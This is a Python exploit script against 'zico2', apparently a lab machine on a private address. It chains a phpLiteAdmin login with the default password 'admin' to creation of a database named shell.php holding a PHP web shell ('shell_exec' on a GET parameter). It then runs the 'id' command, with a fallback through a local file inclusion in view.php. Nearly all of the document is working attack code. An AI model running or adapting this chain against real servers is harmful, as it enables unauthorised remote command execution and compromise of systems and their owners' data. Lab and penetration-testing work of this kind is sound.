#!/usr/bin/env python3
"""zico2 phpLiteAdmin RCE exploit chain"""
import requests
import sys

s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0'
BASE = 'http://192.168.18.132'
PHPLITE = f'{BASE}/dbadmin/test_db.php'

# Step 1: Login phpLiteAdmin
print('[1] Logging in phpLiteAdmin...')
r = s.post(PHPLITE, data={
    'password': 'admin', 'remember': 'on', 'login': 'Login', 'proc_login': 'true'
}, timeout=15)
print(f'    Status: {r.status_code}, Length: {len(r.text)}')
if 'Create' not in r.text and 'create' not in r.text.lower():
    print('[-] Login failed!')
    sys.exit(1)
print('[+] Login OK')

# Step 2: Create database named shell.php
print('[2] Creating shell.php database...')
r2 = s.post(PHPLITE, data={
    'proc_login': '',
    'dbname': 'shell.php',
    'proc_newdb': 'true',
    'newdbname': 'shell.php',
}, timeout=15)
print(f'    Status: {r2.status_code}')

# Step 3: Create table cmd with one TEXT field
print('[3] Creating table "cmd"...')
r3 = s.post(PHPLITE, data={
    'proc_login': '',
    'tablename': 'cmd',
    'proc_newtbl': 'true',
    'newname': 'cmd',
    'num_fields': '1',
    'f0name': 'c',
    'f0type': 'TEXT',
}, timeout=15)
print(f'    Status: {r3.status_code}')

# Step 4: Insert PHP shell into the table
print('[4] Inserting PHP payload...')
r4 = s.post(PHPLITE, data={
    'proc_login': '',
    'tablename': 'cmd',
    'proc_addrow': 'true',
    'val0': '<?php echo shell_exec($_GET["cmd"]); ?>',
    'null_val0': 'NULL',
}, timeout=15)
print(f'    Status: {r4.status_code}')

# Step 5: Check if shell.php was created
print()
print('[5] Testing shell.php...')
paths_to_check = [
    '/dbadmin/shell.php',
    '/dbadmin/database/shell.php',
    '/shell.php',
]
shell_url = None
for p in paths_to_check:
    try:
        r5 = s.get(f'{BASE}{p}', timeout=10)
        print(f'    {p}: {r5.status_code} ({len(r5.text)} bytes)')
        if r5.status_code == 200:
            shell_url = f'{BASE}{p}'
    except Exception as e:
        print(f'    {p}: ERROR - {e}')

# Step 6: Try to execute command
if shell_url:
    print(f'\n[6] Executing command via {shell_url}?cmd=id')
    r6 = s.get(f'{shell_url}?cmd=id', timeout=15)
    print(f'    Status: {r6.status_code}, Length: {len(r6.text)}')
    # Filter out HTML
    import re
    clean = re.sub(r'<[^>]+>', '', r6.text).strip()
    print(f'    Output: {clean[:200]}')
else:
    print('\n[-] shell.php not found. Trying LFI include...')
    # Fallback: try to include via LFI
    lfi_url = f'{BASE}/view.php?page=dbadmin/shell.php'
    r6 = s.get(f'{lfi_url}&cmd=id', timeout=15)
    print(f'    LFI: {r6.status_code} ({len(r6.text)} bytes)')
    import re
    clean = re.sub(r'<[^>]+>', '', r6.text).strip()
    if 'uid=' in clean:
        print(f'[+] RCE via LFI! Output: {clean[:200]}')
